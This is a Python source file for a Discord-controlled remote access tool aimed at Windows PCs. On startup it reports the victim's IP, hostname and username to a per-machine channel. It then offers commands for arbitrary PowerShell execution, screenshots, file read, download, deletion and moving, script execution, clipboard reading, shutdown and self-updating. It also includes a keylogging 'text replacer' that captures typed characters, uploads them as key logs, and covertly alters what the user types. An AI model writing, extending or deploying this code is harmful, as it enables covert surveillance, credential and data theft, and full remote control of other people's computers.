import asyncio
import getpass
import json
import socket
from typing import cast

import discord
import requests
from discord import Interaction, TextChannel, app_commands
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.clipboard import get_clipboard
from src.cmd.delete_file import delete_file
from src.cmd.download_file import download_file
from src.cmd.input_box import inputbox_show
from src.cmd.move_file import move_file
from src.cmd.msgbox import msgbox_show
from src.cmd.openurl import spawn_proc
from src.cmd.popup import popup_show
from src.cmd.read_file import read_file
from src.cmd.run_script import run_script_file
from src.cmd.screenshot import take_screenshot
from src.cmd.shell import execute_cmd
from src.cmd.text_replacer import (
    KEY_LOG_FILE_THRESHOLD,
    active_rules,
    add_replacements,
    buffered_characters,
    clear_replacements,
    current_replacer,
    key_log_exists,
    log_status,
    read_key_log,
    remove_replacement,
    set_replacements,
    start_text_replacer,
    stop_text_replacer,
)
from src.cmd.upload_file import upload_file
from src.cmd.voice import voice_api
from src.cmd.wallpaper import set_wallpaper
from src.constants import UPDATE_TAG, VERSION
from src.utils.updater import update_runtime
from src.utils.utils import send_text_in_chunks

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

channel = None
pc_user_name = "Unknown"
ip = "Unknown"

bot = commands.Bot(command_prefix="z!", intents=intents, owner_id=915623041105551420)


def parse_json_object(raw: str) -> dict | None:
    """Parse a JSON object, returning None when the text is not one."""
    try:
        data = json.loads(raw)
    except ValueError:
        return None

    if not isinstance(data, dict):
        return None

    return data


@bot.event
async def on_ready():
    if not bot.user:
        raise ValueError("Bot user not found.")

    print(f"#- Logged in as {bot.user}!")
    await bot.tree.sync()
    print("i- Slash commands synced.")
    print("#- Connected Guilds:")
    for i, guild in enumerate(bot.guilds):
        print(f"[{i + 1}] {guild.name} (ID: {guild.id})")

    global channel
    global pc_user_name
    global ip

    guild = bot.guilds[0]
    response = await asyncio.to_thread(requests.get, "https://api.ipify.org")
    ip = response.text.replace(".", "-").strip()
    username = getpass.getuser()
    pc_name = socket.gethostname()

    pc_user_name = f"{pc_name.strip()}/{username.strip()}"
    channel_name = (
        f"{pc_user_name.strip().replace('/', '_').replace(' ', '-').lower()}_{ip}"
    )

    channel = next(
        (
            cast(TextChannel, existing_channel)
            for existing_channel in guild.channels
            if existing_channel.name == channel_name
        ),
        None,
    )

    if channel is None:
        channel = await guild.create_text_channel(channel_name)

    connection_msg_string = f"""
======= User **CONNECTED** =======
*Username:* {pc_user_name}
*IP:* {ip.replace("-", ".")}
    """.strip()
    await channel.send(connection_msg_string)


exit_confirmation = False


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if not channel or message.channel.id != channel.id:
        return

    if (
        message.content.strip().lower() == "yes"
        or message.content.strip().lower() == "no"
    ):
        return

    if not message.content.startswith(str(bot.command_prefix)):
        global exit_confirmation

        if message.content.startswith("exit") and not exit_confirmation:
            exit_confirmation = True
            await message.channel.send("*Are you sure you want to exit the process?*")
            return

        exit_confirmation = False
        message.content = f"z!shell {message.content}"

    await bot.process_commands(message)


# ====================
# === LIST COMMAND ===
# ====================
@bot.tree.command(name="list_devices", description="Lists all connected devices")
@commands.is_owner()
@commands.guild_only()
async def list_devices(interaction: Interaction):
    latency = round(bot.latency * 1000)  # latency in milliseconds
    await interaction.response.send_message(
        f"- **User:** {pc_user_name}\t**IP:** {ip.replace('-', '.')}\t*Latency:* {latency / 10}ms"
    )


# ====================
# === PING COMMAND ===
# ====================
@bot.command(name="ping", description="Check the bot's latency.")
@commands.is_owner()
@commands.guild_only()
async def ping(ctx: Context[commands.Bot], *, args: str | None):
    latency = round(bot.latency * 1000)  # latency in milliseconds

    if args and "-v" in args:
        await ctx.reply(
            f"Pong! 🏓 ({latency / 10}ms)\n**User:** {pc_user_name}\n**Version:** {VERSION}\n**Update Tag:** {UPDATE_TAG}"
        )
    else:
        await ctx.reply(f"Pong! 🏓 ({latency / 10}ms)")


# =========================
# === SHELL COMMAND ===
# =========================
@bot.command(name="shell", description="Run powershell commands")
@commands.is_owner()
@commands.guild_only()
async def shell(ctx: Context[commands.Bot], *, user_cmd: str | None):
    if not user_cmd:
        await ctx.reply(
            "⚠️ Please enter a command to execute\nUsage: z!shell `<command>`"
        )
        return

    result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'

    await send_text_in_chunks(ctx, result)


# ===========================
# === SCREENSHOT COMMAND ===
# ===========================
@bot.command(
    name="screenshot",
    description="Capture the bot host's screen and upload it to this channel.",
)
@commands.is_owner()
@commands.guild_only()
async def screenshot(ctx: Context[commands.Bot]):
    await take_screenshot(ctx)


# ===========================
# === VOICE COMMAND ===
# ===========================
@bot.command(name="voice", description="Speak text aloud using Windows text-to-speech.")
@commands.is_owner()
@commands.guild_only()
async def voice(ctx: Context[commands.Bot], *, text: str):
    await voice_api(ctx, text)


# ===========================
# === OPENURL COMMAND ===
# ===========================
@bot.command(
    name="openurl", description="Open a URL in the Windows computer's default browser."
)
@commands.is_owner()
@commands.guild_only()
async def open_url(ctx: Context[commands.Bot], *, url: str):
    await spawn_proc(ctx, url)


# ===========================
# === UPLOAD COMMAND ===
# ===========================
@bot.command(
    name="upload",
    description="Download a file from an attachment or URL and upload it to Discord.",
)
@commands.is_owner()
@commands.guild_only()
async def upload(ctx: Context[commands.Bot], url: str | None = None):
    await upload_file(ctx, url)


# ================================
# === UPDATE APP COMMAND ===
# ================================
@bot.command(
    name="update_app",
    description="Update runtime.exe to the latest GitHub release and restart.",
)
@commands.is_owner()
@commands.guild_only()
async def update_app(ctx: Context[commands.Bot]):
    await update_runtime(ctx)


# ================================
# === TEXT REPLACER COMMAND ===
# ================================
@bot.command(
    name="replacer",
    description="Start, stop or check the live text replacer.",
)
@commands.is_owner()
@commands.guild_only()
async def replacer_command(ctx: Context[commands.Bot], *, action: str = "status"):
    action = action.lower()

    if action == "start":
        await start_text_replacer(ctx)
    elif action == "stop":
        await stop_text_replacer(ctx)
    else:
        instance = current_replacer()
        state = "running" if instance is not None and instance.running else "stopped"
        rules = active_rules()

        # Whether the log file exists decides what is shown.
        has_log_file = key_log_exists()

        # The status and the active rules are written to the key log.
        log_status(state, rules)

        # Without a log file the characters that are still in memory are used.
        contents = read_key_log() if has_log_file else buffered_characters()

        if not contents.strip():
            await ctx.reply(
                "The key log is empty and nothing is buffered in memory yet."
            )
            return

        await send_text_in_chunks(
            ctx,
            contents,
            filename="key_logs.txt",
            file_threshold=KEY_LOG_FILE_THRESHOLD,
        )


@bot.command(
    name="replacements",
    description=(
        "Manage the text replacer rules: "
        'z!replacements {"love": "hate"} sets them, '
        'z!replacements add {"abc": "xyz"} adds them, '
        'z!replacements rm "abc" removes one, '
        "z!replacements del deletes the whole file."
    ),
)
@commands.is_owner()
@commands.guild_only()
async def replacements_command(ctx: Context[commands.Bot], *, args: str = ""):
    args = args.strip()

    if not args:
        await ctx.reply(
            'Usage: `z!replacements {"love": "hate"}`, '
            '`z!replacements add {"abc": "xyz"}`, '
            '`z!replacements rm "abc"` or `z!replacements del`.'
        )
        return

    action, _, rest = args.partition(" ")
    action = action.lower()
    rest = rest.strip()

    if action == "add":
        rules = parse_json_object(rest)

        if rules is None:
            await ctx.reply(
                'The rules must be a JSON object, for example {"abc": "xyz"}.'
            )
            return

        await add_replacements(ctx, rules)
        return

    if action == "rm":
        key = rest.strip('"').strip("'").strip()

        if not key:
            await ctx.reply('Give the key of the rule to remove, e.g. `z!replacements rm "abc"`.')
            return

        await remove_replacement(ctx, key)
        return

    if action == "del":
        await clear_replacements(ctx)
        return

    rules = parse_json_object(args)

    if rules is None:
        await ctx.reply(
            'The rules must be a JSON object, for example {"love": "hate"}.'
        )
        return

    await set_replacements(ctx, rules)


# ===========================
# === DOWNLOAD COMMAND ===
# ===========================
@bot.command(
    name="download", description="Resolve a file path and send the file to Discord."
)
@commands.is_owner()
@commands.guild_only()
async def download(ctx: Context[commands.Bot], *, path: str):
    await download_file(ctx, path)


# ===========================
# === READ FILE COMMAND ===
# ===========================
@bot.command(
    name="read", description="Read a file from disk and send its contents as text."
)
@commands.is_owner()
@commands.guild_only()
async def read(ctx: Context[commands.Bot], *, path: str):
    await read_file(ctx, path)


# =============================
# === RUN SCRIPT COMMAND ===
# =============================
@bot.command(
    name="run_script",
    description="Save an attached Windows script (.ps1, .bat, ...) and run it.",
)
@commands.is_owner()
@commands.guild_only()
async def run_script(
    ctx: Context[commands.Bot], *, destination: str, source: str | None = None
):
    await run_script_file(ctx, destination, source)


# ===========================
# === DELETE COMMAND ===
# ===========================
@bot.command(name="delete", description="Delete a file or a folder")
@commands.is_owner()
@commands.guild_only()
async def delete(ctx: Context[commands.Bot], *, path: str):
    await delete_file(bot, ctx, path)


# ===========================
# === MOVE FILE COMMAND ===
# ===========================
@bot.command(name="move", description="moves files and folders from <src> to <dest>")
@commands.is_owner()
@commands.guild_only()
async def move(ctx: Context[commands.Bot], *, paths: str):
    await move_file(ctx, paths)


# ===========================
# === POPUP COMMAND ===
# ===========================
@bot.command(name="popup", description="Display a native windows popup msgbox")
@commands.is_owner()
@commands.guild_only()
async def popup(ctx: Context[commands.Bot], *, msg: str):
    await popup_show(ctx, msg)


# ===========================
# === MSGBOX COMMAND ===
# ===========================
@bot.command(
    name="msgbox",
    description="Display a native windows popup msgbox with custom buttons",
)
@commands.is_owner()
@commands.guild_only()
async def msgbox(ctx: Context[commands.Bot], *, args: str):
    await msgbox_show(ctx, args)


# ===========================
# === INPUTBOX COMMAND ===
# ===========================
@bot.command(name="inputbox", description="Display a native windows input form")
@commands.is_owner()
@commands.guild_only()
async def inputbox(ctx: Context[commands.Bot], *, prompt: str):
    await inputbox_show(ctx, prompt)


# ===========================
# === SHUTDOWN COMMAND ===
# ===========================
@bot.command(name="shutdown", description="shutdown PC immediately")
@commands.is_owner()
@commands.guild_only()
async def shutdown(ctx: Context[commands.Bot], timeout: str = "0"):
    timeout_seconds = 0
    try:
        timeout_seconds = int(timeout)
    except Exception:
        timeout_seconds = 0

    shutdown_cmd = r"shutdown /s /t " + str(timeout_seconds)
    result = execute_cmd(shutdown_cmd) or f"PC about to shutdown in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === RESTART COMMAND ===
# ===========================
@bot.command(name="restart", description="restart PC immediately")
@commands.is_owner()
@commands.guild_only()
async def restart(ctx: Context[commands.Bot], timeout: str = "0"):
    timeout_seconds = 0
    try:
        timeout_seconds = int(timeout)
    except Exception:
        timeout_seconds = 0

    shutdown_cmd = r"shutdown /r /t " + str(timeout_seconds)
    result = execute_cmd(shutdown_cmd) or f"PC about to restart in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === WALLPAPER COMMAND ===
# ===========================
@bot.command(name="wallpaper", description="Sets the wallpaper of the image provided")
@commands.is_owner()
@commands.guild_only()
async def wallpaper(ctx: Context[commands.Bot]):
    await set_wallpaper(ctx)


# ===========================
# === CLIPBOARD COMMAND ===
# ===========================
@bot.command(name="clipboard", description="Gets content from users clipboard")
@commands.is_owner()
@commands.guild_only()
async def clipboard(
    ctx: Context[commands.Bot], action: str = "read", *, text: str | None = None
):
    await get_clipboard(ctx, action, text or "")
